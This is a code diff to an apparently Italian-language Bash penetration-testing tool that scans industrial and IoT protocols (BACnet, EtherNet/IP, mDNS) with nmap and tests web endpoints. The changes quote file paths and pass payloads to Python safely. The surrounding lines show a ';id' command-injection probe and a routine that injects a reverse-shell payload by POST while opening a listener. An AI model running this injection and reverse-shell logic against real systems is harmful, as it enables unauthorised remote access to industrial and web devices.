@@ -152,10 +152,10 @@ _json_write_summary() {
     # Raccogli findings dal file JSON se esiste
     local findings_json="[]"
     if [[ -f "$dir/findings.json" ]]; then
-        findings_json=$(python3 -c "
-import json,sys
+        findings_json=$(EXA_FINDINGS_FILE="$dir/findings.json" python3 -c "
+import json,os
 try:
-    d=json.load(open('$dir/findings.json'))
+    d=json.load(open(os.environ['EXA_FINDINGS_FILE']))
     print(json.dumps(d.get('findings',[])))
 except:
     print('[]')
@@ -4392,7 +4392,7 @@ cmd_mdns() {
     section "nmap mDNS/DNS-SD Scan"
     local nmap_mdns="$OUTDIR/nmap_mdns.txt"
     if [[ "$target" != "local" ]]; then
-        run_cmd "nmap_mdns" "nmap -sU -p 5353 --script dns-service-discovery -oN $nmap_mdns $NMAP_TIMING $target 2>/dev/null"
+        run_cmd "nmap_mdns" "nmap -sU -p 5353 --script dns-service-discovery -oN \"$nmap_mdns\" $NMAP_TIMING $target 2>/dev/null"
         if [[ -s "$nmap_mdns" ]]; then
             while IFS= read -r line; do
                 echo "$line" | grep -qE "^\|.*_[a-z]+\." || continue
@@ -4626,7 +4626,7 @@ cmd_bacnet() {
     # ── nmap BACnet NSE scripts ───────────────────────────────
     section "BACnet/IP — nmap bacnet-info"
     local nmap_bacnet="$OUTDIR/nmap_bacnet.txt"
-    run_cmd "nmap_bacnet" "nmap -sU -p $port --script bacnet-info -oN $nmap_bacnet $NMAP_TIMING $target 2>/dev/null"
+    run_cmd "nmap_bacnet" "nmap -sU -p $port --script bacnet-info -oN \"$nmap_bacnet\" $NMAP_TIMING $target 2>/dev/null"
     if [[ -s "$nmap_bacnet" ]]; then
         while IFS= read -r line; do
             echo "$line" | grep -qE "^\|.*(" || continue
@@ -4689,7 +4689,7 @@ PYEOF
     # ── nmap scan BACnet port ────────────────────────────────
     section "BACnet Port Scan"
     local bacnet_tcp="$OUTDIR/nmap_bacnet_tcp.txt"
-    run_cmd "nmap_bacnet_tcp" "nmap -p $port -sV --script bacnet-info $NMAP_TIMING $target 2>/dev/null | tee $bacnet_tcp"
+    run_cmd "nmap_bacnet_tcp" "nmap -p $port -sV --script bacnet-info $NMAP_TIMING $target 2>/dev/null | tee \"$bacnet_tcp\""
 
     ok "BACnet audit completato → $OUTDIR"
 }
@@ -5218,7 +5218,7 @@ cmd_enip() {
     # ── nmap EtherNet/IP NSE scripts ─────────────────────────
     section "EtherNet/IP — nmap enip-info"
     local nmap_enip="$OUTDIR/nmap_enip.txt"
-    run_cmd "nmap_enip" "nmap -p $port -sV --script enip-info -oN $nmap_enip $NMAP_TIMING $target 2>/dev/null"
+    run_cmd "nmap_enip" "nmap -p $port -sV --script enip-info -oN \"$nmap_enip\" $NMAP_TIMING $target 2>/dev/null"
     if [[ -s "$nmap_enip" ]]; then
         while IFS= read -r line; do
             echo "$line" | grep -qE "^\|.*(Product|Vendor|Serial|Revision|Identity)" || continue
@@ -5859,7 +5859,7 @@ cmd_http() {
     if [[ $DRY_RUN -eq 0 ]]; then
         for ipath in "${inject_paths[@]}"; do
             for payload in "${inject_payloads[@]}"; do
-                local enc_payload; enc_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")
+                local enc_payload; enc_payload=$(printf '%s' "${payload}" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || printf '%s' "${payload}")
                 local resp
                 resp=$(curl -sk $insecure --max-time 6 \
                     "${base_url}${ipath}${enc_payload}" 2>/dev/null | head -5 || true)
@@ -6121,7 +6121,7 @@ _web_inject_test() {
     local auth=""
     [[ -n "$user" && -n "$pass" ]] && auth="--user ${user}:${pass}"
     local test_cmd=";id"
-    local encoded; encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${test_cmd}'))" 2>/dev/null || \
+    local encoded; encoded=$(printf '%s' "${test_cmd}" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || \
                              printf '%s' "$test_cmd" | od -A n -t x1 | tr -d ' \n' | sed 's/../%&/g')
     local resp
     resp=$(curl -sk $insecure $auth --max-time 8 \
@@ -6419,8 +6419,8 @@ _post_web() {
             section "Exploit Command Injection → Reverse Shell"
             local rs_payload; rs_payload=$(_revshell_payload "$lhost" "$lport" "$payload_type")
             local encoded_payload
-            encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$rs_payload'))" \
-                              2>/dev/null || printf '%s' "$rs_payload")
+            encoded_payload=$(printf '%s' "${rs_payload}" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" \
+                              2>/dev/null || printf '%s' "${rs_payload}")
             _start_listener "$lport"
             sleep 3
             local _li2=0
@@ -6670,8 +6670,8 @@ _post_revshell() {
             if [[ "$test_res" != "CLEAN" ]]; then
                 found CRITICAL "POST:revshell — Command Injection su ${ipath}?${iparam}"
                 local enc
-                enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$rs_payload'))" \
-                      2>/dev/null || printf '%s' "$rs_payload")
+                enc=$(printf '%s' "${rs_payload}" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" \
+                      2>/dev/null || printf '%s' "${rs_payload}")
                 if [[ "$test_res" == "INJECTABLE_POST" ]]; then
                     curl -sk $insecure $auth_curl --max-time 5 -X POST \
                         -d "${iparam}=127.0.0.1;${rs_payload}" \
